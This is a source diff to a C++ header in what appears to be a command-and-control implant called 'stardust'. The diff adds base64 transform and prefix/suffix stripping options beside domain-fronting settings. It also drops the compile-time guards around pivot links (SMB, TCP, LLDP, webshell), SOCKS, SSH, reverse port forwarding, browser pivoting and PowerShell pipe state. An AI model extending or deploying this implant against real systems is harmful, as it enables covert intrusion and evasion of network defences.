@@ -406,6 +406,10 @@ namespace stardust
             char     domain_front[256];
             char     custom_headers[1024];
             uint32_t custom_headers_len;
+            bool     client_transform_b64;
+            bool     server_transform_b64;
+            uint32_t server_strip_prefix;
+            uint32_t server_strip_suffix;
 #endif
 #if defined( GITHUB_TRANSPORT )
             char     github_pat[256];
@@ -471,7 +475,6 @@ namespace stardust
         };
         SmbLink* smb_links;
 
-#if defined( INCLUDE_CMD_CONNECT ) || defined( INCLUDE_CMD_DISCONNECT ) || defined( TCP_TRANSPORT )
         struct TcpLink {
             char      task_uuid[37];
             uint32_t  link_id;
@@ -484,9 +487,7 @@ namespace stardust
         };
         TcpLink* tcp_links;
         void*    tcp_link_state;
-#endif
 
-#if defined( INCLUDE_CMD_LLDP_CONNECT ) || defined( INCLUDE_CMD_LLDP_DISCONNECT ) || defined( LLDP_TRANSPORT )
         struct LldpLink {
             char      task_uuid[37];
             uint32_t  link_id;
@@ -497,9 +498,7 @@ namespace stardust
         };
         LldpLink* lldp_links;
         void*     lldp_link_state;
-#endif
 
-#if defined( INCLUDE_CMD_LINK_WEBSHELL ) || defined( INCLUDE_CMD_UNLINK_WEBSHELL )
         struct WebshellLink {
             char      task_uuid[37];
             uint32_t  link_id;
@@ -515,12 +514,8 @@ namespace stardust
         };
         WebshellLink* webshell_links;
         void*         webshell_link_state;
-#endif
 
-#ifdef INCLUDE_CMD_SOCKS
         void* socks_state;
-#endif
-#ifdef INCLUDE_CMD_SSH
         void* ssh_state;
 
         static constexpr uint32_t MAX_INTERACTIVE_SESSIONS = 4;
@@ -536,13 +531,9 @@ namespace stardust
             uint32_t length;
             uint32_t capacity;
         } interactive_queue = {};
-#endif
-#ifdef INCLUDE_CMD_RPFWD
+
         void* rpfwd_state;
-#endif
-#ifdef INCLUDE_CMD_BROWSERPIVOT
         void* browserpivot_state;
-#endif
 
         struct {
             BCRYPT_ALG_HANDLE h_aes;
@@ -659,13 +650,11 @@ namespace stardust
 
         uint8_t  token_store[1280] = {};
 
-#ifdef INCLUDE_CMD_POWERPICK
         struct {
             HANDLE pipe_read;
             HANDLE pipe_write;
             bool   stdout_redirected;
         } powerpick = {};
-#endif
 
         explicit instance();
 
